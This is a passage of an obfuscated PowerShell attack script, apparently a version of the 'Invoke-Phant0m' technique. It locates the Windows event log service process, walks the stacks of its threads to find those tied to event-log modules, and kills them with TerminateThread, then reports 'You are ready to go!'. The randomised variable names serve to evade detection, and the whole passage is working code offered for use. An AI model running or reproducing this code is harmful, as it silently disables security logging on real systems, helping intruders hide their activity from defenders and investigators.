                    [void]$PGVWfpAQovfGCvG::SymLoadModuleEx($p9f9AtUPt9d9KD9, [IntPtr]::Zero, $zShtHErkIzIGD9c.ToString(), $ZKlOfgPMCqaFPeE.ToString(), $eh9WqtNYQJiWjns.lpBaseOfDll, [Int32]$eh9WqtNYQJiWjns.SizeOfImage, [IntPtr]::Zero, 0)
                }
                Remove-Variable hModules
            }
            function local:Convert-UIntToInt {
                Param(
                    [Parameter(Position = 0, Mandatory = $true)]
                    [UInt64]$Value
                )

                [Byte[]]$qMrPttYJcWSCzxI = [BitConverter]::GetBytes($Value)
                return ([BitConverter]::ToInt64($qMrPttYJcWSCzxI, 0))
            }
            function local:Initialize-Stackframe {
                Param (
                    [Parameter(Mandatory = $true)]
                    $LACo9laJNUx9ohu,

                    [Parameter(Mandatory = $true)]
                    $wvLfipTgxh9fnEt,

                    [Parameter(Mandatory = $true)]
                    $zqsHTUmikxCqZKQ,

                    [Parameter()]
                    $afHRLkGUBVhHqoq
                )

                $9QGe9srKieK9qYD = [Activator]::CreateInstance($LArRW9wavDDNWpJ)
                $adJkVQiPUrdMKx9 = [Activator]::CreateInstance($KwGcTmeuLfo9uc9)
                $adJkVQiPUrdMKx9.Mode = 0x03 # Flat

                $adJkVQiPUrdMKx9.Offset = $LACo9laJNUx9ohu
                $9QGe9srKieK9qYD.AddrPC = $adJkVQiPUrdMKx9

                $adJkVQiPUrdMKx9.Offset = $wvLfipTgxh9fnEt
                $9QGe9srKieK9qYD.AddrFrame = $adJkVQiPUrdMKx9

                $adJkVQiPUrdMKx9.Offset = $zqsHTUmikxCqZKQ
                $9QGe9srKieK9qYD.AddrStack = $adJkVQiPUrdMKx9

                $adJkVQiPUrdMKx9.Offset = $afHRLkGUBVhHqoq
                $9QGe9srKieK9qYD.AddrBStore = $adJkVQiPUrdMKx9

                Write-Output -InputObject $9QGe9srKieK9qYD
            }
            function local:Get-SymbolFromAddress {
                Param (
                    [Parameter(Mandatory = $true)]
                    [IntPtr]$p9f9AtUPt9d9KD9,

                    [Parameter(Mandatory = $true)]
                    $iMKGckRCFuIxcTM
                )


                $P9UYLelfhWDDnjj = [Activator]::CreateInstance($99nVfkefEy9wusJ)
                $P9UYLelfhWDDnjj.SizeOfStruct = [Runtime.InteropServices.Marshal]::SizeOf($P9UYLelfhWDDnjj)
                $P9UYLelfhWDDnjj.MaxNameLength = 32

                $R9KSKHxYKUDkppL = [Runtime.InteropServices.Marshal]::AllocHGlobal($P9UYLelfhWDDnjj.SizeOfStruct)
                [Runtime.InteropServices.Marshal]::StructureToPtr($P9UYLelfhWDDnjj, $R9KSKHxYKUDkppL, $false)

                [void]$PGVWfpAQovfGCvG::SymGetSymFromAddr64($p9f9AtUPt9d9KD9, $iMKGckRCFuIxcTM, 0, $R9KSKHxYKUDkppL)

                $P9UYLelfhWDDnjj = [Runtime.InteropServices.Marshal]::PtrToStructure($R9KSKHxYKUDkppL, [Type]$99nVfkefEy9wusJ)
                [Runtime.InteropServices.Marshal]::FreeHGlobal($R9KSKHxYKUDkppL)

                Write-Output -InputObject $P9UYLelfhWDDnjj
            }


            $AhorOczFGmoiXIO = Get-DelegateType @([IntPtr], [UInt64]) ([IntPtr])
            $yXtpwhuWps9JvY9 = {
                Param([IntPtr]$p9f9AtUPt9d9KD9, [UInt64]$tx9hV9FEHQ9cDei) $PGVWfpAQovfGCvG::SymFunctionTableAccess64($p9f9AtUPt9d9KD9, $tx9hV9FEHQ9cDei)
            }
            $q9UpXOKIoL9LmrP = $yXtpwhuWps9JvY9 -as $AhorOczFGmoiXIO

            $VSxyJagd9czgihv = Get-DelegateType @([IntPtr], [UInt64]) ([UInt64])
            $yXtpwhuWps9JvY9 = {
                Param([IntPtr]$p9f9AtUPt9d9KD9, [UInt64]$iMKGckRCFuIxcTM) $PGVWfpAQovfGCvG::SymGetModuleBase64($p9f9AtUPt9d9KD9, $iMKGckRCFuIxcTM)
            }
            $SZoSlypAgdHPylp = $yXtpwhuWps9JvY9 -as $VSxyJagd9czgihv


            $KcGgmnjmJFj9zCu = [IntPtr]::Zero
            $9QGe9srKieK9qYD = [Activator]::CreateInstance($LArRW9wavDDNWpJ)
            $qGuhLupXTNdNXWA = 0
            $Wow64 = $false
            $QtvWuEsaYAPDjJh = Get-SystemInfo


            if ($QtvWuEsaYAPDjJh.ProcessorArchitecture -ne 0) {
                if (!$Kernel32::IsWow64Process($p9f9AtUPt9d9KD9, [ref]$Wow64)) { Write-Error 'IsWow64Process failure.' }
            }

            if ($Wow64)
            {
                $qGuhLupXTNdNXWA = 0x014C # I386/x86

                Import-ModuleSymbols -p9f9AtUPt9d9KD9 $p9f9AtUPt9d9KD9


                $nPvyPuZAFXBdlfO = [Activator]::CreateInstance($FYe9HWd9pgQjcPL)
                $nPvyPuZAFXBdlfO.ContextFlags = 0x1003F #All
                $KcGgmnjmJFj9zCu = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($nPvyPuZAFXBdlfO))
                [Runtime.InteropServices.Marshal]::StructureToPtr($nPvyPuZAFXBdlfO, $KcGgmnjmJFj9zCu, $false)

                if ($Kernel32::Wow64SuspendThread($FdnZhmsAaP9GBgC) -eq -1) { Write-Error "Unable to suspend thread $ghkYPCiRqZkIXZe." }
                if (!$Kernel32::Wow64GetThreadContext($FdnZhmsAaP9GBgC, $KcGgmnjmJFj9zCu)) { Write-Error "Unable tof get context of thread $ghkYPCiRqZkIXZe." }

                $nPvyPuZAFXBdlfO = [Runtime.InteropServices.Marshal]::PtrToStructure($KcGgmnjmJFj9zCu, [Type]$FYe9HWd9pgQjcPL)
                $9QGe9srKieK9qYD = Initialize-Stackframe $nPvyPuZAFXBdlfO.Eip $nPvyPuZAFXBdlfO.Esp $nPvyPuZAFXBdlfO.Ebp $null
            }


            elseif ($QtvWuEsaYAPDjJh.ProcessorArchitecture -eq 0)
            {
                $qGuhLupXTNdNXWA = 0x014C # I386/x86

                Import-ModuleSymbols -p9f9AtUPt9d9KD9 $p9f9AtUPt9d9KD9


                $nPvyPuZAFXBdlfO = [Activator]::CreateInstance($FYe9HWd9pgQjcPL)
                $nPvyPuZAFXBdlfO.ContextFlags = 0x1003F #All
                $KcGgmnjmJFj9zCu = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($nPvyPuZAFXBdlfO))
                [Runtime.InteropServices.Marshal]::StructureToPtr($nPvyPuZAFXBdlfO, $KcGgmnjmJFj9zCu, $false)

                if ($Kernel32::SuspendThread($FdnZhmsAaP9GBgC) -eq -1) { Write-Error "Unable to suspend thread $ghkYPCiRqZkIXZe." }
                if (!$Kernel32::GetThreadContext($FdnZhmsAaP9GBgC, $KcGgmnjmJFj9zCu)) { Write-Error "Unable tof get context of thread $ghkYPCiRqZkIXZe." }

                $nPvyPuZAFXBdlfO = [Runtime.InteropServices.Marshal]::PtrToStructure($KcGgmnjmJFj9zCu, [Type]$FYe9HWd9pgQjcPL)
                $9QGe9srKieK9qYD = Initialize-Stackframe $nPvyPuZAFXBdlfO.Eip $nPvyPuZAFXBdlfO.Esp $nPvyPuZAFXBdlfO.Ebp $null
            }


            elseif ($QtvWuEsaYAPDjJh.ProcessorArchitecture -eq 9)
            {
                $qGuhLupXTNdNXWA = 0x8664 # AMD64, interesting that MSFT chose the hex 8664 i.e. x86_64 for this constant...

                Import-ModuleSymbols -p9f9AtUPt9d9KD9 $p9f9AtUPt9d9KD9


                $nPvyPuZAFXBdlfO = [Activator]::CreateInstance($htwfIyzycCkYrzr)
                $nPvyPuZAFXBdlfO.ContextFlags = 0x10003B #All
                $KcGgmnjmJFj9zCu = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($nPvyPuZAFXBdlfO))
                [Runtime.InteropServices.Marshal]::StructureToPtr($nPvyPuZAFXBdlfO, $KcGgmnjmJFj9zCu, $false)

                if ($Kernel32::SuspendThread($FdnZhmsAaP9GBgC) -eq -1) { Write-Error "Unable to suspend thread $ghkYPCiRqZkIXZe." }
                if (!$Kernel32::GetThreadContext($FdnZhmsAaP9GBgC, $KcGgmnjmJFj9zCu)) { Write-Error "Unable tof get context of thread $ghkYPCiRqZkIXZe." }

                $nPvyPuZAFXBdlfO = [Runtime.InteropServices.Marshal]::PtrToStructure($KcGgmnjmJFj9zCu, [Type]$htwfIyzycCkYrzr)
                $9QGe9srKieK9qYD = Initialize-Stackframe $nPvyPuZAFXBdlfO.Rip $nPvyPuZAFXBdlfO.Rsp $nPvyPuZAFXBdlfO.Rsp $null
            }


            elseif ($QtvWuEsaYAPDjJh.ProcessorArchitecture -eq 6)
            {
                $qGuhLupXTNdNXWA = 0x0200 # IA64

                Import-ModuleSymbols -p9f9AtUPt9d9KD9 $p9f9AtUPt9d9KD9


                $nPvyPuZAFXBdlfO = [Activator]::CreateInstance($ymPIIPnsRfxBhPC)
                $nPvyPuZAFXBdlfO.ContextFlags = 0x8003D #All
                $KcGgmnjmJFj9zCu = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($nPvyPuZAFXBdlfO))
                [Runtime.InteropServices.Marshal]::StructureToPtr($nPvyPuZAFXBdlfO, $KcGgmnjmJFj9zCu, $false)

                if ($Kernel32::SuspendThread($FdnZhmsAaP9GBgC) -eq -1) { Write-Error "Unable to suspend thread $ghkYPCiRqZkIXZe." }
                if (!$Kernel32::GetThreadContext($FdnZhmsAaP9GBgC, $KcGgmnjmJFj9zCu)) { Write-Error "Unable tof get context of thread $ghkYPCiRqZkIXZe." }

                $nPvyPuZAFXBdlfO = [Runtime.InteropServices.Marshal]::PtrToStructure($KcGgmnjmJFj9zCu, [Type]$ymPIIPnsRfxBhPC)
                $9QGe9srKieK9qYD = Initialize-Stackframe $nPvyPuZAFXBdlfO.StIIP $nPvyPuZAFXBdlfO.IntSp $nPvyPuZAFXBdlfO.RsBSP $nPvyPuZAFXBdlfO.IntSp
            }
            $QtvWuEsaYAPDjJh = $null


            $lcRoDItCIuFvBPc = [Runtime.InteropServices.Marshal]::AllocHGlobal([Runtime.InteropServices.Marshal]::SizeOf($9QGe9srKieK9qYD))
            [Runtime.InteropServices.Marshal]::StructureToPtr($9QGe9srKieK9qYD, $lcRoDItCIuFvBPc, $false)


            do {

                if (!$PGVWfpAQovfGCvG::StackWalk64($qGuhLupXTNdNXWA, $p9f9AtUPt9d9KD9, $FdnZhmsAaP9GBgC, $lcRoDItCIuFvBPc, $KcGgmnjmJFj9zCu, $null, $q9UpXOKIoL9LmrP, $SZoSlypAgdHPylp, $null)) {
                    Write-Error "Unable to get stackframe for thread $ghkYPCiRqZkIXZe."
                }
                $9QGe9srKieK9qYD = [Runtime.InteropServices.Marshal]::PtrToStructure($lcRoDItCIuFvBPc, [Type]$LArRW9wavDDNWpJ)

                $GHhrvRhBnJXrekR = New-Object Text.StringBuilder(256)
                [void]$Psapi::GetMappedFileNameW($p9f9AtUPt9d9KD9, [IntPtr](Convert-UIntToInt $9QGe9srKieK9qYD.AddrPC.Offset), $GHhrvRhBnJXrekR, $GHhrvRhBnJXrekR.Capacity)

                $P9UYLelfhWDDnjj = Get-SymbolFromAddress -p9f9AtUPt9d9KD9 $p9f9AtUPt9d9KD9 -iMKGckRCFuIxcTM $9QGe9srKieK9qYD.AddrPC.Offset
                $ws9A99IjCTQvyzz = (([String]$P9UYLelfhWDDnjj.Name).Replace(' ','')).TrimEnd([Byte]0)

                $K9VfQRTInoOh9Wa = @{
                    ProcessId  = $OsOdK9FSHQbEpCk
                    ThreadId   = $ghkYPCiRqZkIXZe
                    AddrPC     = $9QGe9srKieK9qYD.AddrPC.Offset
                    AddrReturn = $9QGe9srKieK9qYD.AddrReturn.Offset
                    Symbol     = $ws9A99IjCTQvyzz
                    MappedFile = $GHhrvRhBnJXrekR
                }
                New-Object -TypeName PSObject -Property $K9VfQRTInoOh9Wa
            } until ($9QGe9srKieK9qYD.AddrReturn.Offset -eq 0) # End of stack reached


            [Runtime.InteropServices.Marshal]::FreeHGlobal($lcRoDItCIuFvBPc)
            [Runtime.InteropServices.Marshal]::FreeHGlobal($KcGgmnjmJFj9zCu)
            if ($Kernel32::ResumeThread($FdnZhmsAaP9GBgC) -eq -1) { Write-Error "Unable to resume thread $ghkYPCiRqZkIXZe." }
            if (!$Kernel32::CloseHandle.Invoke($FdnZhmsAaP9GBgC)) { Write-Error "Unable to close handle for thread $ghkYPCiRqZkIXZe." }
        }


        Write-Host "[*] Enumerating threads of PID: $(Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)..." -ForegroundColor Yellow
        foreach ($POk9tdfGrdTTYda in (Get-Process -Id (Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)))
            {
                if (($p9f9AtUPt9d9KD9 = $Kernel32::OpenProcess(0x1F0FFF, $false, $POk9tdfGrdTTYda.Id)) -eq 0) {
                    Write-Error -Message "Unable to open handle for process $($POk9tdfGrdTTYda.Id)... Moving on."
                    continue
                }
                if (!$PGVWfpAQovfGCvG::SymInitialize($p9f9AtUPt9d9KD9, $null, $false)) {
                    Write-Error "Unable to initialize symbol handler for process $($POk9tdfGrdTTYda.Id).... Quitting."
                    if (!$Kernel32::CloseHandle.Invoke($p9f9AtUPt9d9KD9)) { Write-Error "Unable to close handle for process $($POk9tdfGrdTTYda.Id)." }
                    break
                }

                $POk9tdfGrdTTYda.Threads | ForEach-Object -Process { Trace-Thread -p9f9AtUPt9d9KD9 $p9f9AtUPt9d9KD9 -ghkYPCiRqZkIXZe $_.Id -OsOdK9FSHQbEpCk $POk9tdfGrdTTYda.Id }

                if (!$PGVWfpAQovfGCvG::SymCleanup($p9f9AtUPt9d9KD9)) { Write-Error "Unable to cleanup symbol resources for process $($POk9tdfGrdTTYda.Id)." }
                if (!$Kernel32::CloseHandle.Invoke($p9f9AtUPt9d9KD9)) { Write-Error "Unable to close handle for process $($POk9tdfGrdTTYda.Id)." }
                [GC]::Collect()
            }


    }# End of ScriptBlock

    if ($PSBoundParameters['ComputerName']) { $u9wbldZugNwnc9S = Invoke-Command -TLWgW9gRYBpzHcx $TLWgW9gRYBpzHcx -ScriptBlock $XwbZjDseIDrbnBN -ArgumentList @($Name, $Id) }
    else { $u9wbldZugNwnc9S = Invoke-Command -ScriptBlock $QzKzGikBpwmZGCD -ArgumentList @($Name, $Id) }

    $mSGeQAvsFstQCEI = $u9wbldZugNwnc9S | Where-Object {$_.MappedFile -like '*evt*'} | %{$_.ThreadId }
    Write-Host "[*] Parsing Event Log Service Threads..." -ForegroundColor Yellow

    if(!($mSGeQAvsFstQCEI)) {
      Write-Host "[!] There are no Event Log Service Threads, Event Log Service is not working!" -ForegroundColor Red
      Write-Host "[+] You are ready to go!" -ForegroundColor Green
      Write-Host ""
    }
    else {
        [array]$array = $mSGeQAvsFstQCEI

        for ($i = 0; $i -lt $array.Count; $i++) {
            $RBE9qXFQJBHJOcw = $Kernel32::OpenThread(0x0001, $false, $($array[$i]))
            if ($kill = $Kernel32::TerminateThread($RBE9qXFQJBHJOcw, 1)) {Write-Host "[+] Thread $($array[$i]) Succesfully Killed!" -ForegroundColor Green}
            $close = $Kernel32::CloseHandle($RBE9qXFQJBHJOcw)
        }

        Write-Host ""
        Write-Host "[+] All done, you are ready to go!" -ForegroundColor Green
        Write-Host ""
    }


    [GC]::Collect()
}
